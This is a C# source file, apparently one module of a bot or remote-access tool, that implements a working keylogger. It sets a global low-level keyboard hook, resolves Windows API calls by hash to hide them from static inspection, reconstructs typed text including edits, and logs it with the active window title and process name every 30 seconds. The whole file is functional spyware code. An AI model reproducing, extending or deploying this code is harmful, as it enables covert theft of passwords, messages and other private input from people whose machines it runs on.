using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Collections.Generic;
using System.Diagnostics;
using VanguardCore;

namespace FinalBot.Modules
{
    public static class KeyloggerModule
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;

        // Hashes for Resolver (DJB2)
        private const uint HASH_SetWindowsHookExW = 0x2A155359;
        private const uint HASH_UnhookWindowsHookEx = 0x429E2F79;
        private const uint HASH_CallNextHookEx = 0xE8602E9B;
        private const uint HASH_GetForegroundWindow = 0x164C8E08;
        private const uint HASH_GetWindowTextW = 0x6F6F2D6B;
        private const uint HASH_GetWindowTextLengthW = 0xA977CC7D;
        private const uint HASH_GetWindowThreadProcessId = 0x296B033F;
        private const uint HASH_GetKeyboardState = 0x6DDC443F;
        private const uint HASH_GetKeyboardLayout = 0x2D79EB6F;
        private const uint HASH_MapVirtualKeyExW = 0xF8E81F91;
        private const uint HASH_ToUnicodeEx = 0x8C9A3D3B;
        private const uint HASH_GetKeyState = 0x32356B2D;

        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        private static List<char> _currentLine = new List<char>();
        private static int _cursorPos = 0;
        private static string _lastWindowTitle = "";
        private static readonly object _lock = new object();

        // Delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Auto)]
        private delegate IntPtr SetWindowsHookExW_t(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool UnhookWindowsHookEx_t(IntPtr hhk);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr CallNextHookEx_t(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GetForegroundWindow_t();
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate int GetWindowTextW_t(IntPtr hWnd, StringBuilder text, int count);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int GetWindowTextLengthW_t(IntPtr hWnd);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint GetWindowThreadProcessId_t(IntPtr hWnd, out uint lpdwProcessId);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool GetKeyboardState_t(byte[] lpKeyState);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate IntPtr GetKeyboardLayout_t(uint idThread);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate uint MapVirtualKeyExW_t(uint uCode, uint uMapType, IntPtr dwhkl);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int ToUnicodeEx_t(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate short GetKeyState_t(int nVirtKey);

        private static SetWindowsHookExW_t _SetWindowsHookEx;
        private static UnhookWindowsHookEx_t _UnhookWindowsHookEx;
        private static CallNextHookEx_t _CallNextHookEx;
        private static GetForegroundWindow_t _GetForegroundWindow;
        private static GetWindowTextW_t _GetWindowText;
        private static GetWindowTextLengthW_t _GetWindowTextLength;
        private static GetWindowThreadProcessId_t _GetWindowThreadProcessId;
        private static GetKeyboardState_t _GetKeyboardState;
        private static GetKeyboardLayout_t _GetKeyboardLayout;
        private static MapVirtualKeyExW_t _MapVirtualKeyEx;
        private static ToUnicodeEx_t _ToUnicodeEx;
        private static GetKeyState_t _GetKeyState;

        public static void Start()
        {
            if (_hookID != IntPtr.Zero) return;

            // Resolve WinAPI
            _SetWindowsHookEx = Resolver.GetDelegate<SetWindowsHookExW_t>("user32.dll", HASH_SetWindowsHookExW);
            _UnhookWindowsHookEx = Resolver.GetDelegate<UnhookWindowsHookEx_t>("user32.dll", HASH_UnhookWindowsHookEx);
            _CallNextHookEx = Resolver.GetDelegate<CallNextHookEx_t>("user32.dll", HASH_CallNextHookEx);
            _GetForegroundWindow = Resolver.GetDelegate<GetForegroundWindow_t>("user32.dll", HASH_GetForegroundWindow);
            _GetWindowText = Resolver.GetDelegate<GetWindowTextW_t>("user32.dll", HASH_GetWindowTextW);
            _GetWindowTextLength = Resolver.GetDelegate<GetWindowTextLengthW_t>("user32.dll", HASH_GetWindowTextLengthW);
            _GetWindowThreadProcessId = Resolver.GetDelegate<GetWindowThreadProcessId_t>("user32.dll", HASH_GetWindowThreadProcessId);
            _GetKeyboardState = Resolver.GetDelegate<GetKeyboardState_t>("user32.dll", HASH_GetKeyboardState);
            _GetKeyboardLayout = Resolver.GetDelegate<GetKeyboardLayout_t>("user32.dll", HASH_GetKeyboardLayout);
            _MapVirtualKeyEx = Resolver.GetDelegate<MapVirtualKeyExW_t>("user32.dll", HASH_MapVirtualKeyExW);
            _ToUnicodeEx = Resolver.GetDelegate<ToUnicodeEx_t>("user32.dll", HASH_ToUnicodeEx);
            _GetKeyState = Resolver.GetDelegate<GetKeyState_t>("user32.dll", HASH_GetKeyState);

            _hookID = SetHook(_proc);
            
            new Thread(() => {
                while (_hookID != IntPtr.Zero)
                {
                    Thread.Sleep(30000); 
                    FlushBuffer();
                }
            }) { IsBackground = true }.Start();
        }

        private static void FlushBuffer()
        {
            lock (_lock)
            {
                if (_currentLine.Count > 0)
                {
                    string log = new string(_currentLine.ToArray());
                    _currentLine.Clear();
                    _cursorPos = 0;
                    Logger.Log($"[KEYLOG] {log}");
                }
            }
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                IntPtr hModule = Marshal.GetHINSTANCE(typeof(KeyloggerModule).Module);
                return _SetWindowsHookEx(WH_KEYBOARD_LL, proc, hModule, 0);
            }
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                ProcessKey(vkCode);
            }
            return _CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private static void ProcessKey(int vk)
        {
            lock (_lock)
            {
                CheckActiveWindow();

                bool ctrl = (_GetKeyState(0x11) & 0x8000) != 0;
                bool alt = (_GetKeyState(0x12) & 0x8000) != 0;
                bool shift = (_GetKeyState(0x10) & 0x8000) != 0;

                // Handle Modifiers
                if (ctrl && !alt)
                {
                    string cmd = vk switch {
                        0x43 => "[CTRL+C]", 0x56 => "[CTRL+V]", 0x58 => "[CTRL+X]", 0x5A => "[CTRL+Z]",
                        _ => ""
                    };
                    if (cmd != "") { InsertAtCursor(cmd); return; }
                }
                if (alt && vk == 0x09) { InsertAtCursor("[ALT+TAB]"); return; }

                // Handle Smart Backspace / Delete / Arrows
                switch (vk)
                {
                    case 0x08: // Backspace
                        if (_cursorPos > 0) { _currentLine.RemoveAt(_cursorPos - 1); _cursorPos--; }
                        return;
                    case 0x2E: // Delete
                        if (_cursorPos < _currentLine.Count) { _currentLine.RemoveAt(_cursorPos); }
                        return;
                    case 0x25: // Left
                        if (_cursorPos > 0) _cursorPos--;
                        return;
                    case 0x27: // Right
                        if (_cursorPos < _currentLine.Count) _cursorPos++;
                        return;
                    case 0x24: // Home
                        _cursorPos = 0;
                        return;
                    case 0x23: // End
                        _cursorPos = _currentLine.Count;
                        return;
                    case 0x0D: // Enter
                        InsertAtCursor("\n");
                        FlushBuffer();
                        return;
                    case 0x09: // Tab
                        InsertAtCursor("    ");
                        return;
                }

                // Handle Characters with Layout Support
                string ch = GetCharsFromKeys((uint)vk, shift);
                if (!string.IsNullOrEmpty(ch))
                {
                    InsertAtCursor(ch);
                }
                else
                {
                    // Specialty keys
                    string spec = vk switch {
                        >= 0x70 and <= 0x7B => $"[F{(vk-0x6F)}]",
                        0x1B => "[ESC]",
                        0x21 => "[PGUP]", 0x22 => "[PGDN]",
                        0x14 => "[CAPS]",
                        _ => ""
                    };
                    if (spec != "") InsertAtCursor(spec);
                }

                if (_currentLine.Count >= 500) FlushBuffer();
            }
        }

        private static void InsertAtCursor(string text)
        {
            foreach (char c in text)
            {
                _currentLine.Insert(_cursorPos, c);
                _cursorPos++;
            }
        }

        private static string GetCharsFromKeys(uint vk, bool shift)
        {
            StringBuilder sb = new StringBuilder(10);
            byte[] state = new byte[256];
            _GetKeyboardState(state);

            IntPtr hkl = _GetKeyboardLayout(0);
            uint scanCode = _MapVirtualKeyEx(vk, 0, hkl);
            int res = _ToUnicodeEx(vk, scanCode, state, sb, sb.Capacity, 0, hkl);

            if (res > 0) return sb.ToString();
            return null;
        }

        private static void CheckActiveWindow()
        {
            IntPtr handle = _GetForegroundWindow();
            if (handle == IntPtr.Zero) return;

            int length = _GetWindowTextLength(handle);
            StringBuilder sb = new StringBuilder(length + 1);
            _GetWindowText(handle, sb, sb.Capacity);
            string title = sb.ToString();

            if (title != _lastWindowTitle)
            {
                FlushBuffer(); // New window, new line
                string timestamp = DateTime.Now.ToString("HH:mm:ss");
                string processName = "Unknown";
                try
                {
                    _GetWindowThreadProcessId(handle, out uint pid);
                    using (var p = Process.GetProcessById((int)pid))
                    {
                        processName = p.ProcessName;
                    }
                }
                catch { }

                Logger.Log($"\n📌 [{timestamp}] [{processName}] {title}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
                _lastWindowTitle = title;
            }
        }
    }
}
